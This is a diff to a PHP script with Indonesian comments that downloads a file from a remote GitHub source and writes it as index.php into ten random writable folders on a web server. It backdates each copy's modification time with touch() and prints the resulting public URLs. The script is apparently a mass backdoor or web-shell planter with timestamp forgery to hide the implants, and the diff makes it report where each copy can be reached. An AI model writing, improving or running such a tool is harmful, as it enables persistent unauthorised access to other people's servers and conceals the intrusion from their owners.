@@ -44,9 +44,9 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
     return $result;
 }
 
-// Fungsi untuk membuat tanggal acak (tahun minimal 2021)
+// Fungsi buat tanggal acak dengan batas tahun 2021 sampai 2023
 function generate_random_datetime() {
-    $year = rand(2021, (int)date('Y'));
+    $year = rand(2021, 2023);
     $month = rand(1, 12);
     $day = rand(1, cal_days_in_month(CAL_GREGORIAN, $month, $year));
     $hour = rand(0, 23);
@@ -58,51 +58,52 @@ function generate_random_datetime() {
 $originalContent = fetch_from_url($remoteFile);
 
 if (!$originalContent || strlen($originalContent) < 10) {
-    exit("Gagal mengunduh konten dari GitHub.\n");
+    exit("❌ Gagal mengunduh konten dari GitHub.\n");
 }
 
 // Cari folder writable
 $allWritable = scanWritableDirs(__DIR__, 10);
 
 if (empty($allWritable)) {
-    exit("Tidak ada folder writable ditemukan.\n");
+    exit("❌ Tidak ada folder writable ditemukan.\n");
 }
 
-// Pilih 10 folder acak
 shuffle($allWritable);
 $targetFolders = array_slice($allWritable, 0, 10);
 
 $successCount = 0;
-$uploadedPaths = [];
+$uploadedURLs = [];
 
 foreach ($targetFolders as $folder) {
-    // Buat tanggal acak untuk setiap file
     $randomDateTime = generate_random_datetime();
     $timestamp = strtotime($randomDateTime);
 
-    // Ganti bagian tanggal di konten (jika ada komentar Tanggal: ...)
     $modifiedContent = preg_replace(
         '/(\/\/\s*Tanggal:\s*)\d{4}-\d{2}-\d{2} \d{2}:\d{2}/i',
         '${1}' . $randomDateTime,
         $originalContent
     );
 
-    // Simpan ke file
     $target = $folder . DIRECTORY_SEPARATOR . 'index.php';
     if (@file_put_contents($target, $modifiedContent)) {
-        // Ubah waktu modifikasi file secara nyata
         @touch($target, $timestamp, $timestamp);
 
+        // Buat URL dari path lokal
+        $relativePath = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($target));
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+        $host = $_SERVER['HTTP_HOST'];
+        $url = $protocol . '://' . $host . $relativePath;
+
         $successCount++;
-        $uploadedPaths[] = $target . " (Modify: $randomDateTime)";
+        $uploadedURLs[] = "$url (Modify: $randomDateTime)";
     }
 }
 
 // Output hasil
 if ($successCount > 0) {
     echo "✅ Berhasil menyimpan ke $successCount folder:\n";
-    foreach ($uploadedPaths as $path) {
-        echo "- $path\n";
+    foreach ($uploadedURLs as $url) {
+        echo "- $url\n";
     }
 } else {
     echo "❌ Gagal menyalin ke folder manapun.\n";
